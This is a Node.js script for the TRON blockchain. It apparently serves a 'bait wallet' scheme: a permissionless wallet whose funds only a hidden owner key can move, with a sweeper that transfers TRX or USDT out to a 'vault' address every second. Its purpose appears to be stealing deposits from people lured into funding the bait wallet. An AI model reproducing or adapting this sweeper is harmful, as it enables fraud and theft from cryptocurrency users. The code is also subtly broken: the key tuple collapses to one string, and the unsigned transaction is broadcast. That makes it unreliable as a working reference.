// Requirements
const TronWeb = require('tronweb');
var request = require('request');
const fs = require('fs');
// TRON Settings  //
const privateKeys = ("BaitKeyHere","OwnerKeyHere") // Wallet no perm + Owner
const publicAddress = "BaitKeyAddress" // TRX - Public address to transfer from, where the funds are
const targetAddress = "VaultAddy" // TRX - Money to transfer to
// --------------------------------------------------------------------------------   //

// USDT Settings //
const USDTOwnerKey = "OwnerKeyHere"; // Owner Private Key
const USDTcontractAddress = "ContactAddyHere"; // USDT Contact address
const USDTfromAddress = publicAddress; 
const USDTtoAddress = "XXXXXXXXXXX";
const USDTapiKey = "XXXXXXXXXXX"; // chaingateway.io API Key (needed for USDT transfers only)
const USDTamount = "1";
// // --------------------------------------------------------------------------------   // //

// Execution settings
var TransferType = 3; // 1 = TRX | 2 = USDT | 3 = Only Show  Balance
var AutoWithdrawl = true; // Only supported with TRX, will spam withdraw to targetAddress

const tronWeb = new TronWeb(  
'https://api.trongrid.io',  
'https://api.trongrid.io',  
'https://api.trongrid.io',  
privateKeys,  
);  

async function getBalance() { 
  const accountDt = await tronWeb.trx.getAccount(publicAddress);
  console.log("Current Balance: " + accountDt.balance)
}

async function sendTRX() {  
 var fromAddress = tronWeb.address.toHex(publicAddress); //address _from
 var toAddress = tronWeb.address.toHex(targetAddress); //address _to
 const accountDt = await tronWeb.trx.getAccount(publicAddress);
 let currentBalance = accountDt.balance
 let dtBalance = accountDt.balance * 0.10 // 10% off
 let newBalance = accountDt.balance - dtBalance
 let amount = 1000000; // = 1 tron = 1MILL

const tradeobj = await tronWeb.transactionBuilder.sendTrx(
  toAddress,
  newBalance, // Balance - 10% if you want static balance use 'amount'
  fromAddress,
);
const signedTx = await tronWeb.trx.multiSign(tradeobj, privateKeys,0); // Lets  Sign dat shit!
const broadcast = await tronWeb.trx.sendRawTransaction(tradeobj);
console.log("Detected Balance: " + currentBalance)
console.log("Calculated Balance to Transfer: " + newBalance)
console.log("Withdrawl Successful ! TXNID:" + broadcast.txid)
}
async function sendUSDT(){
var sendTransaction = {
  uri: 'https://eu.trx.chaingateway.io/v1/sendTRC20',
  method: 'POST',
  json: {
      "contractaddress": USDTcontractAddress,
      "from": USDTfromAddress,
      "to": USDTtoAddress,
      "privatekey": USDTOwnerKey,
      "amount": USDTamount,
      "apikey": USDTapiKey
  }
};

request(sendTransaction, function (error, txnResponse, body) {
  if (txnResponse.body.ok == false){
    console.log("--> ERROR: " + txnResponse.body.description)
  }
 txnId = txnResponse.body.txid
 fs.writeFile("USDT.txt", txnId, (err) => {
   if (err)
     console.log(err);
   else {
     console.log("TxnID Wrote Successfully! (" + txnId + ")");
   }
 });
 getTransactionUSDT();
});
}
async function getTransactionUSDT(){
  await sleep(3000)
function sleep(ms) {
  return new Promise((resolve) => {
    setTimeout(resolve, ms);
  });
}
  fs.readFile('USDT.txt','utf8', function(err, data){
      
    console.log("Reading TXN... (" + data + ")");
    var getTransaction = {
      uri: 'https://eu.trx.chaingateway.io/v1/getTransaction',
      method: 'POST',
      json: {
          "txid": data,
          "apikey": USDTapiKey
      }
    };
    
    request(getTransaction, function (error, response, body) {
      
    if  (response.body.ok == true)  {
      console.log(response.body)
    }
    else{
      console.log("Transacation Failed ! ")
    }
    });
});

}

if (TransferType == 1 && AutoWithdrawl == false){
  console.log("Staring Mode: TRX Transfer...")
                    sendTRX()
}
if (TransferType == 2){
  console.log("Staring Mode: USDT Transfer...")
                    sendUSDT();
}
if (TransferType == 3){
    console.log("Staring Mode: Show Balance..")
                    getBalance();
  }
if (TransferType == 1 && AutoWithdrawl == true ){
  console.log("Staring Mode: Auto TRX Withdrawl...")
                   setInterval(sendTRX, 1000)
}








